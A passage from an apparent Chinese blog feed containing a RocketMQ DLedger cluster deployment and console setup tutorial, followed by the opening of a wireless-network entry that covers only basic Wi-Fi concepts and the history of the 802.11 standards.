class="line"> [admin@rocketmq1 rocketmq]$ bash bin/mqshutdown broker</span><br></pre></td></tr></table></figure><h3 id="3-5-Dledger-模式"><a href="#3-5-Dledger-模式" class="headerlink" title="3.5 Dledger 模式"></a>3.5 Dledger 模式</h3><p>RocketMQ 4.5 以前的版本大多都是采用 Master-Slave 架构来部署，能在一定程度上保证数据的不丢失，也能保证一定的可用性。</p><p>但是那种方式 的缺陷很明显，最大的问题就是当 Master Broker 挂了之后 ，没办法让 Slave Broker 自动 切换为新的 Master Broker，需要手动更改配置将 Slave Broker 设置为 Master Broker，以及重启机器，这个非常麻烦。</p><p>在手动运维的期间，可能会导致系统的不可用。</p><p>使用 Dledger 技术要求至少由三个 Broker 组成 ，一个 Master 和两个 Slave，这样三个 Broker 就可以组成一个 Group ，也就是三个 Broker 可以分组来运行。一但 Master 宕机，Dledger 就可以从剩下的两个 Broker 中选举一个 Master 继续对外提供服务。</p><h4 id="3-5-1-DLedger-多副本即主从切换核心配置参数"><a href="#3-5-1-DLedger-多副本即主从切换核心配置参数" class="headerlink" title="3.5.1 DLedger 多副本即主从切换核心配置参数"></a>3.5.1 DLedger 多副本即主从切换核心配置参数</h4><table><thead><tr><th>配置名称</th><th>含义</th></tr></thead><tbody><tr><td>enableDLegerCommitLog</td><td>是否启用 DLedger，即是否启用 RocketMQ 主从切换，默认值为 false。如果需要开启主从切换，则该值需要设置为 true。</td></tr><tr><td>dLegerGroup</td><td>节点所属的 raft 组，建议与 brokerName 保持一致，例如 broker-a。</td></tr><tr><td>dLegerPeers</td><td>集群节点信息，示例配置如下：n0-127.0.0.1:40911;n1-127.0.0.1:40912;n2-127.0.0.1:40913，多个节点用英文冒号隔开，单个条目遵循 legerSlefId-ip:端口，这里的端口用作 dledger 内部通信。</td></tr><tr><td>dLegerSelfId</td><td>当前节点id。取自 legerPeers 中条目的开头，即上述示例中的 n0，并且特别需要强调，只能第一个字符为英文，其他字符需要配置成数字。</td></tr><tr><td>storePathRootDir</td><td>DLedger 日志文件的存储根目录，为了能够支持平滑升级，该值与 storePathCommitLog 设置为不同的目录</td></tr></tbody></table><p><strong>环境如下：</strong></p><table><thead><tr><th>主机</th><th>IP地址</th><th>组件划分</th></tr></thead><tbody><tr><td>rocketmq1</td><td>192.168.10.76</td><td>Nameserver1、Broker_Master-1</td></tr><tr><td>rocketmq2</td><td>192.168.10.77</td><td>Nameserver2、Broker_Master_slave-1</td></tr><tr><td>rocketmq3</td><td>192.168.10.78</td><td>Nameserver3、Broker_Master_slave-2</td></tr></tbody></table><h4 id="3-5-2-创建目录修改配置"><a href="#3-5-2-创建目录修改配置" class="headerlink" title="3.5.2 创建目录修改配置"></a>3.5.2 创建目录修改配置</h4><p><strong>创建数据目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在各服务器执行以下命令创建数据目录</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/commitlog</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/index</span><br></pre></td></tr></table></figure><p><strong>修改日志路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在各服务器执行以下命令修改日志存储路径</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ sed -i  <span class="string">'s#$&#123;user.home&#125;#/home/admin/rocketmq/data#g'</span> conf/*.xml</span><br></pre></td></tr></table></figure><p><strong>配置rocketmq</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master-1</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ cat conf/2m-2s-sync/broker-a.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster</span><br><span class="line">brokerName=rocketmq-broker-m1</span><br><span class="line">brokerId=0</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=ASYNC_MASTER</span><br><span class="line">flushDiskTyp=ASYNC_FLUSH</span><br><span class="line"><span class="comment"># dledger 相关的配置属性</span></span><br><span class="line">enableDLegerCommitLog=<span class="literal">true</span></span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store/dledger</span><br><span class="line">dLegerGroup=rocketmq-broker-m1</span><br><span class="line">dLegerPeers=n0-192.168.10.76:40911;n1-192.168.10.77:40911;n2-192.168.10.78:40911</span><br><span class="line">dLegerSelfId=n0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master_slave-1</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq2 rocketmq]$ cat conf/2m-2s-sync/broker<span class="_">-a</span>-s.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster</span><br><span class="line">brokerName=rocketmq-broker-m1</span><br><span class="line">brokerId=1</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=SLAVE</span><br><span class="line">flushDiskTyp=ASYNC_FLUSH</span><br><span class="line"><span class="comment"># dledger 相关的配置属性</span></span><br><span class="line">enableDLegerCommitLog=<span class="literal">true</span></span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store/dledger</span><br><span class="line">dLegerGroup=rocketmq-broker-m1</span><br><span class="line">dLegerPeers=n0-192.168.10.76:40911;n1-192.168.10.77:40911;n2-192.168.10.78:40911</span><br><span class="line">dLegerSelfId=n1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master_slave-1</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq3 rocketmq]$ cat conf/2m-2s-sync/broker<span class="_">-a</span>-s.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster</span><br><span class="line">brokerName=rocketmq-broker-m1</span><br><span class="line">brokerId=2</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=SLAVE</span><br><span class="line">flushDiskTyp=ASYNC_FLUSH</span><br><span class="line"><span class="comment"># dledger 相关的配置属性</span></span><br><span class="line">enableDLegerCommitLog=<span class="literal">true</span></span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store/dledger</span><br><span class="line">dLegerGroup=rocketmq-broker-m1</span><br><span class="line">dLegerPeers=n0-192.168.10.76:40911;n1-192.168.10.77:40911;n2-192.168.10.78:40911</span><br><span class="line">dLegerSelfId=n2</span><br></pre></td></tr></table></figure><h4 id="3-5-3-启动NameServer"><a href="#3-5-3-启动NameServer" class="headerlink" title="3.5.3 启动NameServer"></a>3.5.3 启动NameServer</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动Nameserver1</span></span><br><span class="line">[admin@rocketmq1 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Nameserver2</span></span><br><span class="line">[admin@rocketmq2 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Nameserver3</span></span><br><span class="line">[admin@rocketmq3 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br></pre></td></tr></table></figure><h4 id="3-5-4-启动Broker"><a href="#3-5-4-启动Broker" class="headerlink" title="3.5.4 启动Broker"></a>3.5.4 启动Broker</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动Broker_Master-1</span></span><br><span class="line">[admin@rocketmq1 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-sync/broker-a.properties &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Broker_Master_slave-1</span></span><br><span class="line">[admin@rocketmq2 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-sync/broker<span class="_">-a</span>-s.properties &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Broker_Master_slave-2</span></span><br><span class="line">[admin@rocketmq3 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-sync/broker<span class="_">-a</span>-s.properties &amp;</span><br></pre></td></tr></table></figure><h4 id="3-5-5-测试Master自动切换"><a href="#3-5-5-测试Master自动切换" class="headerlink" title="3.5.5 测试Master自动切换"></a>3.5.5 测试Master自动切换</h4><p>通过3.6步安装rocketmq-console，在浏览器输入 <a href="http://IP:8080" target="_blank" rel="noopener">http://IP:8080</a> 访问控制台，显示集群状态如下：</p><p><img src="/2021/01/11/rocketmq-ji-qun-yuan-li-ji-bu-shu-fang-shi/%E5%9B%BE%E7%89%877.png" alt="图片7"></p><p>通过上图可以看到，当前192.168.10.77是master节点。</p><p>接下来停止192.168.10.77上的broker服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq2 rocketmq]$ bash bin/mqshutdown broker</span><br><span class="line">[admin@rocketmq2 rocketmq]$ jps</span><br><span class="line">5530 NamesrvStartup</span><br><span class="line">6956 Jps</span><br></pre></td></tr></table></figure><p>再次查看群集状态</p><p><img src="/2021/01/11/rocketmq-ji-qun-yuan-li-ji-bu-shu-fang-shi/%E5%9B%BE%E7%89%878.png" alt="图片8"></p><p>可以看到当前192.168.10.78被选举成了master</p><h3 id="3-6-通过控制台连接rocketmq"><a href="#3-6-通过控制台连接rocketmq" class="headerlink" title="3.6 通过控制台连接rocketmq"></a>3.6 通过控制台连接rocketmq</h3><h4 id="3-6-1-下载rocketmq-console"><a href="#3-6-1-下载rocketmq-console" class="headerlink" title="3.6.1 下载rocketmq-console"></a>3.6.1 下载rocketmq-console</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 ~]$ git <span class="built_in">clone</span> https://github.com/apache/rocketmq-externals.git</span><br></pre></td></tr></table></figure><h4 id="3-6-2-修改配置文件"><a href="#3-6-2-修改配置文件" class="headerlink" title="3.6.2 修改配置文件"></a>3.6.2 修改配置文件</h4><p><strong>修改pom.xml文件删掉如下plugins段内容</strong>，在234行附近</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 ~]$ <span class="built_in">cd</span> rocketmq-externals/rocketmq-console/</span><br><span class="line">[admin@rocketmq1 rocketmq-console]$ vim pom.xml</span><br><span class="line"></span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;2.17&lt;/version&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;validate&lt;/id&gt;</span><br><span class="line">                        &lt;phase&gt;validate&lt;/phase&gt;</span><br><span class="line">                        &lt;configuration&gt;</span><br><span class="line">                            &lt;excludes&gt;src/main/resources&lt;/excludes&gt;</span><br><span class="line">                            &lt;configLocation&gt;style/rmq_checkstyle.xml&lt;/configLocation&gt;</span><br><span class="line">                            &lt;encoding&gt;UTF-8&lt;/encoding&gt;</span><br><span class="line">                            &lt;consoleOutput&gt;<span class="literal">true</span>&lt;/consoleOutput&gt;</span><br><span class="line">                            &lt;failsOnError&gt;<span class="literal">true</span>&lt;/failsOnError&gt;</span><br><span class="line">                        &lt;/configuration&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;check&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br></pre></td></tr></table></figure><p><strong>修改连接rocketmq的地址</strong>，主要修改连接rocketmq的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 rocketmq-console]$ vim src/main/resources/application.properties</span><br><span class="line"></span><br><span class="line">rocketmq.config.namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876;192.168.10.79:9876</span><br></pre></td></tr></table></figure><h4 id="3-6-3-编译rocketmq-console"><a href="#3-6-3-编译rocketmq-console" class="headerlink" title="3.6.3 编译rocketmq-console"></a>3.6.3 编译rocketmq-console</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 rocketmq-console]$ mvn clean package -Dmaven.test.skip=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="3-6-4-启动rocketmq-console"><a href="#3-6-4-启动rocketmq-console" class="headerlink" title="3.6.4 启动rocketmq-console"></a>3.6.4 启动rocketmq-console</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 rocketmq-console]$ java -jar target/rocketmq-console-ng-2.0.0.jar</span><br></pre></td></tr></table></figure><h4 id="3-6-5-访问rocketmq-console控制台"><a href="#3-6-5-访问rocketmq-console控制台" class="headerlink" title="3.6.5 访问rocketmq-console控制台"></a>3.6.5 访问rocketmq-console控制台</h4><p>在浏览器输入 <a href="http://IP:8080" target="_blank" rel="noopener">http://IP:8080</a></p><p><img src="/2021/01/11/rocketmq-ji-qun-yuan-li-ji-bu-shu-fang-shi/%E5%9B%BE%E7%89%875.png" alt="图片5"></p><h3 id="3-7-rocketmq配置解析"><a href="#3-7-rocketmq配置解析" class="headerlink" title="3.7 rocketmq配置解析"></a>3.7 rocketmq配置解析</h3><table><thead><tr><th>配置名称</th><th>含义</th></tr></thead><tbody><tr><td>brokerClusterName</td><td>所属集群名字</td></tr><tr><td>brokerName</td><td>broker名字</td></tr><tr><td>brokerId</td><td>0 Master | &gt;0 Slave</td></tr><tr><td>namesrvAddr</td><td>nameServer地址,分号分隔</td></tr><tr><td>listenPort</td><td>Broker 对外服务的监听端口，默认10911</td></tr><tr><td>defaultTopicQueueNums</td><td>发送消息时,自动创建服务器不存在的topic,默认创建的队列数</td></tr><tr><td>autoCreateTopicEnable</td><td>是否允许 Broker 自动创建Topic, 通常线下开启，线上关闭</td></tr><tr><td>autoCreateSubscriptionGroup</td><td>是否允许 Broker 自动创建订阅组, 通常线下开启, 线上关闭</td></tr><tr><td>listenPort</td><td>Broker 服务对外监听端口</td></tr><tr><td>deleteWhen</td><td>删除文件时间点，默认凌晨 4点</td></tr><tr><td>fileReservedTime</td><td>文件保留时间，默认 48 小时</td></tr><tr><td>mapedFileSizeCommitLog</td><td>commitLog每个文件的大小默认1G</td></tr><tr><td>mapedFileSizeConsumeQueue</td><td>ConsumeQueue每个文件默认存30W条,根据业务情况调整</td></tr><tr><td>destroyMapedFileIntervalForcibly</td><td>强制删除文件间隔时间（单位毫秒）</td></tr><tr><td>redeleteHangedFileInterval</td><td>定期检查Hanged文件间隔时间（单位毫秒）</td></tr><tr><td>diskMaxUsedSpaceRatio</td><td>检测物理文件磁盘空间</td></tr><tr><td>maxMessageSize</td><td>限制的消息大小</td></tr><tr><td>sendMessageThreadPoolNums</td><td>发消息线程池数量</td></tr><tr><td>pullMessageThreadPoolNums</td><td>拉消息线程池数量</td></tr><tr><td>brokerRole</td><td>Broker 的角色 [ASYNC_FLUSH 异步复制Master, SYNC_MASTER 同步双写Master],从节点为SLAVE</td></tr><tr><td>flushDiskType</td><td>刷盘方式[ASYNC_FLUSH 异步刷盘, SYNC_FLUSH 同步刷盘]</td></tr><tr><td>storePathRootDir</td><td>存储路径</td></tr><tr><td>storePathCommitLog</td><td>消费队列存储路径存储路径</td></tr><tr><td>storePathConsumeQueue</td><td>消费队列存储路径存储路径</td></tr><tr><td>storePathIndex</td><td>消息索引存储路径</td></tr><tr><td>storeCheckpoint</td><td>checkpoint 文件存储路径</td></tr><tr><td>abortFile</td><td>abort 文件存储路径</td></tr></tbody></table><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:49 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;一、RocketMQ简介&quot;&gt;&lt;a href=&quot;#一、RocketMQ简介&quot; class=&quot;headerlink&quot; title=&quot;一、R
      
    
    </summary>
    
    
      <category term="消息队列" scheme="http://chenzhonzhou.github.io/categories/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    
      <category term="RocketMQ" scheme="http://chenzhonzhou.github.io/categories/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/RocketMQ/"/>
    
    
      <category term="消息队列" scheme="http://chenzhonzhou.github.io/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    
      <category term="RocketMQ" scheme="http://chenzhonzhou.github.io/tags/RocketMQ/"/>
    
  </entry>
  
  <entry>
    <title>Kali 无线网络渗透</title>
    <link href="http://chenzhonzhou.github.io/2021/01/07/kali-wu-xian-wang-luo-shen-tou/"/>
    <id>http://chenzhonzhou.github.io/2021/01/07/kali-wu-xian-wang-luo-shen-tou/</id>
    <published>2021-01-07T09:03:21.000Z</published>
    <updated>2021-01-23T14:33:38.721Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h1 id="无线网络渗透"><a href="#无线网络渗透" class="headerlink" title="无线网络渗透"></a>无线网络渗透</h1><p>无线网络是采用无线通信技术进行数据传输的网络。由于无线网络使用方便，其应用非常广泛。在无线网络中，数据是以广播的形式传输，所以引起了无线网络的安全问题。虽然用户可以通过设置不同的加密方法来保证数据的安全，但由于某些加密算法存在漏洞和用户缺少必要的安全意识，使得专业人员可以轻松获取无线网络的各种数据。</p><h2 id="一、无线网络概述"><a href="#一、无线网络概述" class="headerlink" title="一、无线网络概述"></a>一、无线网络概述</h2><p>无线网络与有线网络相比较，其搭建非常简单，仅需要一个无线路由器和一个无线客户端即可。</p><h3 id="1-1-无线网络组成"><a href="#1-1-无线网络组成" class="headerlink" title="1.1 无线网络组成"></a>1.1 无线网络组成</h3><p>通常情况下，无线网络是由路由器和无线客户端两部分组成。在专业术语中，通常称路由器为AP（Access Point，接入点）；无线客户端为STA（Station），即装有无线网卡的客户端，如手机、笔记本和平板电脑等。在一个无线网络中，至少有一个AP和一个或一个以上的无线客户端。其中，无线网络的组成如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><h3 id="1-2-无线网络工作流程"><a href="#1-2-无线网络工作流程" class="headerlink" title="1.2 无线网络工作流程"></a>1.2 无线网络工作流程</h3><p>无线网络工作流程如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><p>在该工作流程中包括4个步骤。如下：<br>（1）由于AP会定时地广播SSID，所以STA可监听到AP发出的信号。当STA加入无线网络时，会发送一个探测请求。当AP收到该请求时，回应一个含频带信息的响应包。此时，STA会切换到指定的频带。<br>（2）STA将提供密码，以认证该无线网络。当AP对STA提交的认证信息确认正确后，即允许STA接入无线网络。<br>（3）STA和AP建立关联。在关联过程中，STA与AP之间要根据信号的强弱协商速率，直至关联成功。其中，一个STA同时只能与一个AP关联。<br>（4）此时，STA和AP就可以进行数据收发了。</p><h2 id="二、802-11协议概述"><a href="#二、802-11协议概述" class="headerlink" title="二、802.11协议概述"></a>二、802.11协议概述</h2><p>IEEE 802.11是现今无线局域网通用的标准，它是由电气和电子工程师协会（IEEE）为无线局域网络制定的标准。虽然经常将Wi-Fi与802.11混为一谈，但两者并不等同。如果要对无线网络渗透，必须了解它的协议标准。所以，这里将对802.11协议进行详细介绍。</p><h3 id="2-1-什么是802-11协议"><a href="#2-1-什么是802-11协议" class="headerlink" title="2.1 什么是802.11协议"></a>2.1 什么是802.11协议</h3><p>802.11是IEEE最初制定的一个无线局域网标准，也是在无线局域网领域内的第一个国际认可的协议。它主要用于解决办公室局域网和校园网中用户与用户终端的无线接入，速率最高只能达到2Mbps。由于802.11在速率和传输距离上不能满足人们的需要，IEEE小组又相继推出了802.11b和802.11a两个新标准。三者技术上的主要差别在于MAC子层和物理层。其中，IEEE 802.11系列协议标准的发展史如下表所示。</p><table><thead><tr><th>协议标准</th><th>发布时间（年）</th><th>频段</th><th>描述</th></tr></thead><tbody><tr><td>802.11</td><td>1999</td><td>2.4GHz</td><td>定义微波和红外线的物理层和MAC子层</td></tr><tr><td>802.11a</td><td>1999年9月</td><td>5GHz</td><td>定义了微波物理层及MAC子层</td></tr><tr><td>802.11b</td><td>1999年9月</td><td>2.4GHz</td><td>物理层补充DSSS</td></tr><tr><td>802.11b+</td><td>2002</td><td>2.4GHz</td><td>物理层补充PBCC</td></tr><tr><td>802.11c</td><td>2000</td><td></td><td>关于802.11网络和普通以太网之间的互通协议</td></tr><tr><td>802.11d</td><td>2000</td><td></td><td>关于国际间漫游的规范</td></tr><tr><td>802.11e</td><td>2004</td><td></td><td>对服务等级QoS的支持</td></tr><tr><td>802.11f</td><td>2003</td><td></td><td>基站的互联性</td></tr><tr><td>802.11g</td><td>2003年6月</td><td>2.4GHz</td><td>物理层补充OFDM</td></tr><tr><td>802.11h</td><td>2003</td><td>5GHz</td><td>扩展物理层和MAC子层标准</td></tr><tr><td>802.11i</td><td>2004</td><td></td><td>安全和鉴权方面的补充</td></tr><tr><td>802.11j</td><td>2004</td><td>5GHz</td><td>扩展物理层和MAC子层标准</td></tr><tr><td>802.11k</td><td>2005</td><td></td><td>基于无结局域网和微波测量规范</td></tr><tr><td>802.11m</td><td>2006</td><td></td><td>基于无线局域网的设备维护规范</td></tr><tr><td>802.11n</td><td>2009年9月</td><td>2.4GHz/5GHz</td><td>导入MIMO（多输入输出）技术</td></tr><tr><td>802.11ac</td><td>2014年1月</td><td>5GHz</td><td>沿用802.11n的MIMO技术，为它的传输速率达到Gbps量级打下了基础。第一阶段的目标达到的速率为1Gbps，目的是达到有线电缆的传输速率</td></tr></tbody></table><p>从上表中可以看到，每个802.11协议标准使用的频段不同。其中，包括两个频段，分别是2.4GHz和5GHz。关于这两个频段的区别将在后面讲解。</p><h3 